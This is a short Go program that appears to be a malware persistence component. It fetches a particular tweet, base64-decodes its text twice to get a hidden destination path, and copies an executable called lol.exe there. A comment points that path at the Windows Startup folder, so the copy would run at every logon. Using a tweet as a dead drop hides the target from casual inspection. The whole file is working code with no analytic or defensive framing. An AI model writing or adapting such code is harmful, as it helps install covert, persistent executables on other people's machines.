package main

//b64 st men
//%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\lol.exe

import (
	"encoding/base64"
	"fmt"
	"io"
	"os"

	twt_get "github.com/n0madic/twitter-scraper"
)

func hErr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	srcd, err := os.Getwd()
	src := srcd + "\\lol.exe"
	hErr(err)
	dev(src)
}

func dev(src string) {
	scraper := twt_get.New()

	tweet, err := scraper.GetTweet("1404190504946786304")
	hErr(err)
	p1_1, err := base64.StdEncoding.DecodeString(tweet.Text)
	hErr(err)
	p1_1_1, err := base64.StdEncoding.DecodeString(string(p1_1))
	hErr(err)
	cpy(src, string(p1_1_1))
}

func cpy(src, dest string) {

	fmt.Println(src)
	fmt.Println(dest)

	from, err := os.Open(src)
	hErr(err)
	defer from.Close()

	os.Create(dest)
	to, err := os.OpenFile(dest, os.O_RDWR, 0666)
	hErr(err)
	defer to.Close()

	_, err = io.Copy(to, from)
	hErr(err)
}
